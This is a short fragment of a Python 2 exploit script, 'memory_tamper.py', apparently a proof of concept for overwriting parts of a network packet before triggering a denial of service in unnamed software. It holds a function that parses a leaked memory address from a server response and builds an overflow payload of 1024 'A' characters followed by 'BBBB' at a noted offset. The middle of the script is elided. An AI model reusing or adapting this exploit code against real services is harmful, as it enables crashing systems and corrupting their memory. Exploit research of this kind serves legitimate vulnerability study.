#!/usr/bin/env python2
#
# Program name    : memory_tamper.py
# Version         : 1.0
# Author          : wetw0rk
# Python version  : 2.7
#
# Description:
#   This simply shows we can overwrite sections of the packet proir to
#   triggering a DoS.
#
...
def parse_leak(leak):
  print("[*] RAW RESPONSE: %s" % repr(leak))
  leak = int(leak.split("\x00")[7])
  print("[+] Overwrite address at: %s" % hex(leak))

payload  = "A" * 1024 # offset to parameter
payload += "BBBB"     # UNIX EPOCH
